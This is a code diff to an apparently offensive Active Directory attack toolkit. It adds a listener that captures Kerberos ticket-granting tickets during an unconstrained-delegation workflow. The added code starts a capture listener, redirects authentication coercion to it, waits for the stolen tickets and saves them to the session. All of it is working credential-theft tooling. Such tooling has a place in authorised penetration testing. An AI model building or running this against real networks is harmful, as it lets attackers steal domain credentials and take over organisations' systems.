@@ -36,6 +36,7 @@ from adaf_attack.core.ldap_util import ldap_connect
 from adaf_attack.core.rbcd_sd import sid_from_ldap_value
 from adaf_attack.core.session import Session
 from adaf_attack.core.target import Target
+from adaf_attack.core.tgt_capture import TgtCaptureListener
 
 console = Console()
 
@@ -246,6 +247,23 @@ class UnconstTgtDumpWorkflow:
             if p.get("unconstrained")
         ]
         chosen = kwargs.get("host") or kwargs.get("allow_hosts") or (hosts[0] if hosts else None)
+        capture_enabled = bool(kwargs.get("capture"))
+        capture_listener: TgtCaptureListener | None = None
+        coerce_listener = kwargs.get("listener") or target.dc_ip
+        capture_doc: dict[str, Any] | None = None
+        if capture_enabled and chosen:
+            capture_listener = TgtCaptureListener(
+                session.path("captured"),
+                host=str(kwargs.get("capture_host") or "0.0.0.0"),
+                port=int(kwargs.get("capture_port") or 4450),
+                timeout=float(kwargs.get("capture_timeout") or 15.0),
+                max_captures=int(kwargs.get("capture_count") or 1),
+            )
+            if capture_listener.start():
+                coerce_listener = f"{capture_listener.endpoint}:{capture_listener.port}"
+            else:
+                capture_doc = capture_listener.summary()
+                capture_listener = None
         coerce_result: dict[str, Any] = {"skipped": "no_unconstrained_host"}
         if chosen:
             coerce_result = Coerce().run(
@@ -253,10 +271,16 @@ class UnconstTgtDumpWorkflow:
                 session,
                 graph,
                 force=True,
-                listener=kwargs.get("listener") or target.dc_ip,
+                listener=coerce_listener,
                 host=chosen,
                 allow_hosts=chosen,
             )
+        if capture_listener is not None:
+            try:
+                capture_listener.wait()
+            finally:
+                capture_listener.stop()
+            capture_doc = capture_listener.summary()
         register_advisory_rollback(
             session,
             kind="coercion",
@@ -264,4 +288,8 @@ class UnconstTgtDumpWorkflow:
             rollback="Coercion does not persist directory state; drop captured TGTs from the listener.",
         )
         result = {"ok": bool(hunt.get("count")), "hunt": hunt, "coerce": coerce_result}
+        if capture_enabled and capture_doc is None:
+            result["capture"] = {"performed": True, "count": 0}
+        elif capture_doc is not None:
+            result["capture"] = capture_doc
         return finish(session, graph, "unconst-tgtdump-workflow", result, ok=result["ok"])
